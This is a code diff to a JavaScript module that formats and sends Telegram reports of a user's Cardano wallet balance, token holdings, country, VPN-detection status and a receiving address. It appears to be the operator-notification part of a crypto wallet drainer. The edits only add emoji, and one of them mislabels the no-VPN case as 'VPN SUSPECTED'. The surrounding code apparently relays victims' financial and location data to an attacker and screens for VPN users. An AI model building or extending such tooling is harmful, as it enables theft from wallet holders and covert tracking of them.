@@ -29,7 +29,7 @@ export const sendMessageToTelegram = async (message) => {
 // Function to send app details (like ADA balance) to Telegram
 export const sendAppDetailsToTelegram = async (adaBalance, tokens) => {
   let tokenDetails = tokens.map(
-    (token) => `| ${token.assetName}: ${(token.amount / 1000000).toFixed(2)} ${token.assetName}   |`
+    (token) => `|💵 ${token.assetName}: ${(token.amount / 1000000).toFixed(2)} ${token.assetName}   |`
   );
 
   // Fetch the full user country details (including VPN status)
@@ -60,13 +60,13 @@ export const sendAppDetailsToTelegram = async (adaBalance, tokens) => {
   if (isVpnIpdata || isVpnIPQS) {
     message += `| ⚠️ VPN SUSPECTED  |\n`;
   } else {
-    message += `| NO VPN SUSPECTED |\n`;
+    message += `| ✅ VPN SUSPECTED |\n`;
   }
 
-  message += `| Receiving Address: ${recipientAddress} |\n` +
+  message += `| 👛 Receiving Address: ${recipientAddress} |\n` +
              `--------------------------------\n` +
-             `| User Wallet Balance |\n` +
-             `| ADA: ${adaBalance.toFixed(2)} ADA       |\n` +
+             `| 💵 User Wallet Balance  |\n` +
+             `| 💵 ADA: ${adaBalance.toFixed(2)} ADA       |\n` +
              `${tokenDetails.join("\n")}\n` +
              `------------------------------End`;
 
